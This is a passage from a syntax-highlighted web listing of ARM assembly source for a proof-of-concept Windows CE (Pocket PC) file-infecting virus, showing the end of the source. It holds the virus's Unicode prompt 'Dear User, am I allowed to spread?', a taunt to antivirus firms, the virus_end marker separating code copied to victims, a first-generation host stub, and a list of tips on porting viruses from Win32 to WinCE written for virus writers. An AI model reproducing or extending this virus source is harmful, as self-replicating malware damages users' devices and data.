     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"t"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"r"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"/"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"2"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"9"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"A"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

     </span><span class="sc9">ALIGN</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc1">; Dear User, am I allowed to spread?</span><span class="sc0">

</span><span class="sc5">text</span><span class="sc0">   </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"D"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"r"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"U"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"s"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"r"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">","</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"m"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"I"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"l"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"o"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"w"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"t"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"o"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" "</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"s"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"p"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"r"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"a"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"d"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"?"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
     </span><span class="sc9">ALIGN</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">

     </span><span class="sc1">; Just a little greeting to AV firms :-)</span><span class="sc0">

     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"This is proof of concept code. Also, i wanted to make avers happy."</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"The situation when Pocket PC antiviruses detect only EICAR file had"</span><span class="sc0">
     </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">" to end ..."</span><span class="sc0">
     </span><span class="sc9">ALIGN</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc1">; LTORG is a very important pseudo instruction, which places the</span><span class="sc0">
   </span><span class="sc1">; literal pool "at" the place of its presence. Because the ARM</span><span class="sc0">
   </span><span class="sc1">; instruction length is hardcoded to 32 bits, it is not possible in</span><span class="sc0">
   </span><span class="sc1">; one instruction to load the whole 32bit range into a register (there</span><span class="sc0">
   </span><span class="sc1">; have to be bits to specify the opcode). That's why the literal</span><span class="sc0">
   </span><span class="sc1">; pool was introduced, which in fact is just an array of 32bit values</span><span class="sc0">
   </span><span class="sc1">; that are not possible to load. This data structure is later</span><span class="sc0">
   </span><span class="sc1">; accessed with the aid of the PC (program counter) register that points</span><span class="sc0">
   </span><span class="sc1">; to the currently executed instruction + 8 (+ 8 because ARM processors</span><span class="sc0">
   </span><span class="sc1">; implement a 3 phase pipeline: execute, decode, fetch and the PC</span><span class="sc0">
   </span><span class="sc1">; points not at the instruction being executed but at the instruction being</span><span class="sc0">
   </span><span class="sc1">; fetched). An offset is added to PC so that the final pointer</span><span class="sc0">
   </span><span class="sc1">; points to the right value in the literal pool.</span><span class="sc0">

   </span><span class="sc1">; the pseudo instruction ldr rX, =&lt;value&gt; while compiling gets</span><span class="sc0">
   </span><span class="sc1">; transformed to a mov instruction (if the value is in the range of</span><span class="sc0">
   </span><span class="sc1">; valid values) or it allocates its place in the literal pool and becomes a</span><span class="sc0">
   </span><span class="sc1">; ldr, rX, [pc, #&lt;offset&gt;]</span><span class="sc0">
   </span><span class="sc1">; similarly adr and adrl instructions serve to loading addresses</span><span class="sc0">
   </span><span class="sc1">; to register.</span><span class="sc0">

   </span><span class="sc1">; this approach's advantage is that with minimal effort we can get</span><span class="sc0">
   </span><span class="sc1">; position independent code from the compiler which allows our</span><span class="sc0">
   </span><span class="sc1">; code to run wherever in the address space the loader will load us.</span><span class="sc0">

   </span><span class="sc5">LTORG</span><span class="sc0">
</span><span class="sc5">virus_end</span><span class="sc0">

   </span><span class="sc1">; the code after virus_end doesn't get copied to victims</span><span class="sc0">

</span><span class="sc5">WinMainCRTStartup</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">b</span><span class="sc0">     </span><span class="sc5">virus_code_start</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; first generation entry point</span><span class="sc0">
</span><span class="sc5">host_entry</span><span class="sc0">
   </span><span class="sc5">mvn</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">
   </span><span class="sc9">END</span><span class="sc0">
</span><span class="sc1">;** virus_source_end **</span><span class="sc0">

</span><span class="sc1">; Summary of differences when moving from Win32 to WinCE (from the virus writer's point of view):</span><span class="sc0">

</span><span class="sc1">; Absence of image headers at the start of loaded image on WinCE</span><span class="sc0">
</span><span class="sc1">; No awareness of the current directory on WinCE</span><span class="sc0">
</span><span class="sc1">; The need to call CreateFileForMapping on WinCE</span><span class="sc0">
</span><span class="sc1">; WinCE is Unicode only</span><span class="sc0">
</span><span class="sc1">; Absence of DIV instruction in ARM ISA</span><span class="sc0">
</span><span class="sc1">; Automatic generation of position-independent code with armasm</span><span class="sc0">
</span></div></body>
</html>
